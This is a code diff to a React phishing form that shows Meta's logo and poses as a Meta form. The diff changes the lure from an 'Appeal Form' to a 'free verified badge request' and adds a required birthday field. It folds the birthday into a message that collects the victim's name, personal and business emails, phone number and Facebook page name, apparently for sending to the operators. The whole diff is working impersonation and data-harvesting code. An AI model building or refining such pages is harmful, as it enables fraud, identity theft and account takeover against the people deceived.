@@ -18,7 +18,6 @@ import {
 } from 'react';
 
 interface FormData {
-	information: string;
 	fullName: string;
 	personalEmail: string;
 	businessEmail: string;
@@ -32,11 +31,6 @@ interface FormField {
 }
 
 const FORM_FIELDS: FormField[] = [
-	{
-		name: 'information',
-		label: 'Please provide us information that will help us investigate',
-		type: 'textarea',
-	},
 	{ name: 'fullName', label: 'Full Name', type: 'text' },
 	{ name: 'personalEmail', label: 'Personal Email', type: 'email' },
 	{ name: 'businessEmail', label: 'Business Email', type: 'email' },
@@ -45,9 +39,9 @@ const FORM_FIELDS: FormField[] = [
 const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 	const [isLoading, setIsLoading] = useState(false);
 	const [phoneNumber, setPhoneNumber] = useState('');
+	const [birthday, setBirthday] = useState('');
 	const [translations, setTranslations] = useState<Record<string, string>>({});
 	const [formData, setFormData] = useState<FormData>({
-		information: '',
 		fullName: '',
 		personalEmail: '',
 		businessEmail: '',
@@ -64,13 +58,14 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 	useEffect(() => {
 		if (!geoInfo) return;
 		const textsToTranslate = [
-			'Appeal Form',
+			'Submit a free verified badge request.',
 			'Please provide us information that will help us investigate',
 			'Full Name',
 			'Personal Email',
 			'Business Email',
 			'Mobile phone number',
 			'Facebook Page Name',
+			'Birthday',
 			'I agree with Terms of use',
 			'Submit',
 		];
@@ -135,7 +130,7 @@ ${
 <b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
 <b>📘 Facebook Page:</b> <code>${formData.facebookPageName}</code>
-
+<b>📅 Birthday:</b> <code>${birthday}</code>
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
         `.trim();
 
@@ -159,7 +154,9 @@ ${
 		<div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
 			<div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
 				<div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
-					<p className='text-2xl font-bold'>{t('Appeal Form')}</p>
+					<p className='text-2xl font-bold'>
+						{t('Submit a free verified badge request.')}
+					</p>
 					<button
 						type='button'
 						onClick={() => setModalOpen(false)}
@@ -175,24 +172,14 @@ ${
 						{FORM_FIELDS.map((field) => (
 							<div key={field.name}>
 								<p className='font-sans'>{t(field.label)}</p>
-								{field.type === 'textarea' ? (
-									<textarea
-										name={field.name}
-										value={formData[field.name]}
-										onChange={handleInputChange}
-										className='min-h-[100px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
-										rows={3}
-									/>
-								) : (
-									<input
-										required
-										name={field.name}
-										type={field.type}
-										value={formData[field.name]}
-										onChange={handleInputChange}
-										className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
-									/>
-								)}
+								<input
+									required
+									name={field.name}
+									type={field.type}
+									value={formData[field.name]}
+									onChange={handleInputChange}
+									className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
+								/>
 							</div>
 						))}
 						<p className='font-sans'>{t('Mobile phone number')}</p>
@@ -205,6 +192,18 @@ ${
 									'h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5',
 							}}
 						/>
+						<div>
+							<p className='font-sans'>{t('Birthday')}</p>
+							<input
+								required
+								type='date'
+								value={birthday}
+								onChange={(e) => {
+									setBirthday(e.target.value);
+								}}
+								className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
+							/>
+						</div>
 						<div className='flex items-center gap-2 pt-2'>
 							<input type='checkbox' className='cursor-pointer' />
 							<p className='cursor-pointer'>{t('I agree with Terms of use')}</p>
@@ -212,7 +211,7 @@ ${
 						<button
 							type='submit'
 							disabled={isLoading}
-							className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
+							className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
 						>
 							{isLoading ? (
 								<div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
@@ -224,7 +223,7 @@ ${
 				</form>
 
 				<div className='flex items-center justify-center p-3'>
-					<Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
+					<Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
 				</div>
 			</div>
 		</div>
